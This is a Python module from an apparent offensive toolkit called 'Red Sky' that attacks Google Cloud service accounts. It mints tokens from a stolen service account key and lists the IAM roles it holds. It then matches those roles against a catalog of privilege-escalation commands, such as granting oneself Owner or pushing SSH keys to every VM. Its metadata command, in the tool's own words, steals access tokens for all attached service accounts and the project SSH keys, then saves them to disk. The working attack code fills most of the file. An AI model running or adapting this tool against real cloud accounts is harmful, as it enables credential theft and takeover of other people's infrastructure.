# language: Python, file: Program/cloud/gcp.py, target: Red Sky cloud — GCP IAM + SA abuse
# Service account key abuse, IAM escalation paths, metadata token theft,
# Cloud Functions/Lambda-equivalent privesc. No google-cloud SDK dependency —
# everything talks the public REST endpoints. Uses a service account JSON key
# or the metadata server for auth.

import json
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

import requests

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


CLOUD_DIR = OUTPUT_DIR / "cloud"
GCP_DIR = CLOUD_DIR / "gcp"
GCP_DIR.mkdir(parents=True, exist_ok=True)


CRM = "https://cloudresourcemanager.googleapis.com/v1"
IAM = "https://iam.googleapis.com/v1"
METADATA = "http://metadata.google.internal"


# ── auth ──
def _jwt_from_sa(sa_json: Dict, scope: str = "https://www.googleapis.com/auth/cloud-platform") -> Optional[str]:
    """Mint a self-signed JWT from a service account JSON. Returns the JWT
    ready to exchange for an access token at oauth2.googleapis.com."""
    try:
        import jwt  # PyJWT
    except ImportError:
        print_err("PyJWT required — pip install PyJWT cryptography")
        return None

    now = int(time.time())
    claims = {
        "iss": sa_json["client_email"],
        "sub": sa_json["client_email"],
        "aud": "https://oauth2.googleapis.com/token",
        "iat": now,
        "exp": now + 3600,
        "scope": scope,
    }
    try:
        return jwt.encode(claims, sa_json["private_key"], algorithm="RS256")
    except Exception as e:
        print_err("jwt sign failed: " + str(e))
        return None


def _token_from_sa(sa_json: Dict, scope: str = "https://www.googleapis.com/auth/cloud-platform") -> Optional[str]:
    jwt_assertion = _jwt_from_sa(sa_json, scope)
    if not jwt_assertion:
        return None
    try:
        r = requests.post("https://oauth2.googleapis.com/token", data={
            "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
            "assertion": jwt_assertion,
        }, timeout=15)
        j = r.json()
        if "access_token" in j:
            return j["access_token"]
        print_err("token exchange failed: " + json.dumps(j)[:400])
    except Exception as e:
        print_err("token exchange request failed: " + str(e))
    return None


def _load_sa(path: str) -> Optional[Dict]:
    p = Path(path).expanduser()
    if not p.exists():
        print_err("SA JSON not found: " + str(p))
        return None
    try:
        return json.loads(p.read_text())
    except json.JSONDecodeError as e:
        print_err("bad SA JSON: " + str(e))
        return None


def _hdr(token: str) -> Dict[str, str]:
    return {"Authorization": "Bearer " + token, "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"}


# ── commands ──
def cmd_whoami(sa_path: str, out_file: str) -> int:
    sa = _load_sa(sa_path)
    if not sa:
        return 1
    token = _token_from_sa(sa)
    if not token:
        return 1

    # GET the SA itself + the caller's project
    email = sa.get("client_email", "")
    project = sa.get("project_id", "")

    print_info("GCP service account identity")
    print_kv("client_email", email)
    print_kv("project_id", project)
    print_kv("private_key_id", sa.get("private_key_id", ""))

    # get the SA's IAM policy
    try:
        r = requests.post(IAM + "/projects/-/serviceAccounts/" + email + ":getIamPolicy",
                          headers=_hdr(token), json={}, timeout=15)
        if r.status_code == 200:
            pol = r.json()
            print()
            print_info("SA IAM policy")
            for b in pol.get("bindings", []):
                role = b.get("role", "")
                members = b.get("members", [])
                if any(email in m for m in members):
                    print("  " + SCARLET + "*" + RESET + " " + BONE + role + RESET)
    except Exception as e:
        print_warn("getIamPolicy failed: " + str(e))

    # get the SA's project roles via the project policy
    try:
        r = requests.post(CRM + "/projects/" + project + ":getIamPolicy",
                          headers=_hdr(token), json={}, timeout=15)
        if r.status_code == 200:
            pol = r.json()
            print()
            print_info("project IAM bindings for this SA")
            for b in pol.get("bindings", []):
                if any(email in m for m in b.get("members", [])):
                    print("  " + SCARLET + "*" + RESET + " " + BONE + b["role"] + RESET)
    except Exception as e:
        print_warn("project getIamPolicy failed: " + str(e))

    out = Path(out_file) if out_file else GCP_DIR / ("whoami_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"sa": sa, "token_ok": bool(token)}, indent=2))
    print()
    print_kv("saved", out)
    return 0


# ── privesc catalog ──
GCP_PRIVESC = [
    {
        "name": "iam.serviceAccountTokenCreator",
        "on": "any service account",
        "impact": "mint short-lived access tokens as that SA — full impersonation",
        "cli": "gcloud auth print-access-token --impersonate-service-account=TARGET@PROJ.iam.gserviceaccount.com",
    },
    {
        "name": "iam.serviceAccounts.actAs",
        "on": "any service account",
        "impact": "deploy compute/cloud-functions/cloud-run as that SA",
        "cli": "gcloud compute instances create pwn --service-account TARGET@PROJ.iam.gserviceaccount.com",
    },
    {
        "name": "iam.serviceAccountKeys.create",
        "on": "any service account",
        "impact": "create a permanent JSON key for that SA",
        "cli": "gcloud iam service-accounts keys create key.json --iam-account TARGET@PROJ.iam.gserviceaccount.com",
    },
    {
        "name": "resourcemanager.projects.setIamPolicy",
        "on": "project",
        "impact": "grant yourself Owner",
        "cli": "gcloud projects add-iam-policy-binding PROJ --member user:YOU --role roles/owner",
    },
    {
        "name": "compute.instances.setMetadata",
        "on": "any VM",
        "impact": "add an SSH key or a startup-script to the instance",
        "cli": "gcloud compute instances add-metadata TARGET --metadata ssh-keys='user:ssh-rsa AAAA...'",
    },
    {
        "name": "compute.instances.setServiceAccount",
        "on": "any VM",
        "impact": "attach a privileged SA to an instance you control",
        "cli": "gcloud compute instances set-service-account TARGET --service-account=SA --scopes=cloud-platform",
    },
    {
        "name": "compute.projects.setCommonInstanceMetadata",
        "on": "project",
        "impact": "push SSH keys to EVERY VM in the project",
        "cli": "gcloud compute project-info add-metadata --metadata ssh-keys='user:ssh-rsa AAAA...'",
    },
    {
        "name": "cloudfunctions.functions.create",
        "on": "project",
        "impact": "deploy a function as a privileged SA and invoke",
        "cli": "gcloud functions deploy pwn --runtime python311 --trigger-http --service-account SA",
    },
    {
        "name": "cloudfunctions.functions.update",
        "on": "existing function",
        "impact": "replace its code, invoke with its SA",
        "cli": "gcloud functions deploy TARGET --source=./pwn --runtime python311",
    },
    {
        "name": "iam.workloadIdentityPools.create",
        "on": "project",
        "impact": "federate an external IdP you control into GCP",
        "cli": "gcloud iam workload-identity-pools create pwn --location global",
    },
]


def cmd_privesc(sa_path: str, out_file: str) -> int:
    sa = _load_sa(sa_path)
    if not sa:
        return 1
    token = _token_from_sa(sa)
    if not token:
        return 1

    print_info("GCP privesc surface")
    print()

    # fetch the caller's effective roles
    project = sa.get("project_id", "")
    email = sa.get("client_email", "")
    my_roles = set()
    if project:
        try:
            r = requests.post(CRM + "/projects/" + project + ":getIamPolicy",
                              headers=_hdr(token), json={}, timeout=15)
            if r.status_code == 200:
                for b in r.json().get("bindings", []):
                    if any(email in m for m in b.get("members", [])):
                        my_roles.add(b["role"])
        except Exception as e:
            print_warn("project getIamPolicy failed: " + str(e))

    print_kv("roles", str(len(my_roles)))
    for r in sorted(my_roles):
        print("  " + SCARLET + "*" + RESET + " " + BONE + r + RESET)
    print()

    # match against privesc catalog
    hits = []
    for t in GCP_PRIVESC:
        # primitive match — role must have permission by name substring
        short = t["name"].split(".")[-1].lower()
        role_str = " ".join(my_roles).lower()
        if short in role_str or t["name"] in role_str:
            hits.append(t)

    print_info(str(len(hits)) + " candidate(s) based on role-name match")
    print()
    for t in hits:
        print(SCARLET + "▓ " + RESET + BONE + t["name"] + RESET)
        print("  " + ASH + "on:     " + RESET + t["on"])
        print("  " + ASH + "impact: " + RESET + t["impact"])
        print("  " + ASH + "cli:    " + RESET + CLOT + t["cli"] + RESET)
        print()

    # and print the full catalog as reference
    if not hits:
        print_info("full catalog (check each manually with testIamPermissions)")
        for t in GCP_PRIVESC:
            print("  " + SCARLET + "*" + RESET + " " + BONE + t["name"] + RESET
                  + "  " + ASH + t["impact"][:80] + RESET)

    out = Path(out_file) if out_file else GCP_DIR / ("privesc_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"roles": sorted(my_roles), "candidates": hits}, indent=2))
    print()
    print_kv("saved", out)
    return 0


# ── metadata endpoint (from inside a GCP resource) ──
def cmd_metadata(out_file: str) -> int:
    print_info("GCP metadata server")
    print()

    # 1. instance identity
    hdr = {"Metadata-Flavor": "Google"}
    try:
        r = requests.get(METADATA + "/computeMetadata/v1/instance/?recursive=true",
                         headers=hdr, timeout=5)
        if r.status_code != 200:
            print_err("no metadata server: " + str(r.status_code))
            print_info("this only works from inside a GCP resource")
            return 1
        inst = r.json()
    except Exception as e:
        print_err("no metadata server: " + str(e))
        return 1

    print_ok("instance metadata")
    print_kv("name", inst.get("name", ""))
    print_kv("id", str(inst.get("id", "")))
    print_kv("zone", inst.get("zone", "").split("/")[-1])
    print_kv("machineType", inst.get("machineType", "").split("/")[-1])

    # 2. attached service accounts
    r = requests.get(METADATA + "/computeMetadata/v1/instance/service-accounts/",
                     headers=hdr, timeout=5)
    accounts = [a.strip("/") for a in r.text.splitlines() if a.strip()]
    print()
    print_info(str(len(accounts)) + " service account(s)")
    for a in accounts:
        print("  " + SCARLET + "*" + RESET + " " + BONE + a + RESET)

    # 3. mint a token for each SA
    tokens = {}
    for a in accounts:
        try:
            r = requests.get(METADATA + "/computeMetadata/v1/instance/service-accounts/" + a + "/token",
                             headers=hdr, timeout=5)
            if r.status_code == 200:
                j = r.json()
                tokens[a] = j
                print()
                print_ok("token for " + a)
                print_kv("expires_in", str(j.get("expires_in", "")) + "s")
                print_kv("scopes", j.get("scope", "")[:120])
                print("  access_token: " + j["access_token"][:80] + "...")
        except Exception as e:
            print_warn("token for " + a + " failed: " + str(e))

    # 4. ssh keys, project metadata
    try:
        ssh = requests.get(METADATA + "/computeMetadata/v1/project/attributes/ssh-keys",
                           headers=hdr, timeout=5).text
        if ssh:
            print()
            print_info("project ssh keys")
            print("  " + CLOT + ssh[:500] + RESET)
    except Exception:
        pass

    out = Path(out_file) if out_file else GCP_DIR / ("metadata_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"instance": inst, "accounts": accounts, "tokens": tokens}, indent=2))
    print()
    print_kv("saved", out)
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky cloud gcp", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="whoami",
                   choices=["whoami", "privesc", "metadata", "list"])
    p.add_argument("--sa", default="", help="path to service account JSON")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky cloud gcp <whoami|privesc|metadata|list> [--sa key.json]")
        return 2

    if ns.help:
        print_info("whoami --sa key.json   -- SA identity + IAM policies")
        print_info("privesc --sa key.json  -- match SA roles against escalation catalog")
        print_info("metadata               -- steal tokens from the metadata server (in-GCP only)")
        print_info("list                   -- show the privesc catalog")
        return 0

    if ns.action == "list":
        print_info(str(len(GCP_PRIVESC)) + " GCP privesc techniques")
        print()
        for t in GCP_PRIVESC:
            print(SCARLET + "* " + RESET + BONE + t["name"] + RESET)
            print("  " + ASH + "on:     " + RESET + t["on"])
            print("  " + ASH + "impact: " + RESET + t["impact"])
            print("  " + ASH + "cli:    " + RESET + CLOT + t["cli"] + RESET)
            print()
        return 0

    if ns.action == "whoami":
        if not ns.sa:
            print_err("--sa key.json required")
            return 2
        return cmd_whoami(ns.sa, ns.out)
    if ns.action == "privesc":
        if not ns.sa:
            print_err("--sa key.json required")
            return 2
        return cmd_privesc(ns.sa, ns.out)
    if ns.action == "metadata":
        return cmd_metadata(ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
